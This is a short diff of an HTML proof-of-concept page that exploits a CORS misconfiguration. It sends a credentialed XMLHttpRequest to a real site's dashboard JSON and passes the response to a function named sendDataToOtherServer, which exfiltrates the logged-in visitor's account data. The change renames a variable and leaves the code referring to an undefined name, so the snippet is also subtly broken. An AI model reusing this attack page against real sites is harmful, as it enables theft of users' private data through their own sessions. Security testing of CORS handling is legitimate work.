@@ -1,6 +1,6 @@
 <html>
 <body>
-    <h1> CORS </h1>
+    <h1> CORS2 </h1>
     <script>
 var req = new XMLHttpRequest();
 var url = "https://padlet.com/dashboard.json";        
@@ -12,7 +12,7 @@ req.withCredentials = true;
 req.send(null);
 
 function retrieveKeys() {
-    var responseData = this.responseText; // Corrected variable name
+    var data = this.responseText; // Corrected variable name
     sendDataToOtherServer(responseData);
 }
 
